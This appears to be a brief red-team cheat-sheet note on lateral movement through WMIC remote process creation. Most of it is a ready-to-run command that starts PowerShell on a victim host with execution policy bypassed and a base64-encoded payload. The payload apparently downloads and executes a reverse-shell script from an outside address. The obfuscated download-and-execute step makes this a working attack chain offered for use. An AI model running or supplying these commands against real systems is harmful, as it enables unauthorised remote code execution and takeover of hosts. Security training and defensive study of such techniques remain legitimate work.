
> [!IMPORTANT]
> This note is a work-in-progress.

**The below WMIC syntax requires the victim to:**
- Have WMI enabled.
- Have the remote executing user be apart of the "Local Administrators" group.

```powershell
# Syntax
wmic /node:<victim_ip> process call create "<command_to_execute>"

# Example: Lateral Movement via RevShell Stager
wmic /node:"host.example.com" process call create "powershell -nop -ex bypass -wi h -e aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEAMAAuADEAMAAvAHIAZQB2AHMAaABlAGwAbAAnACkAKQA="
```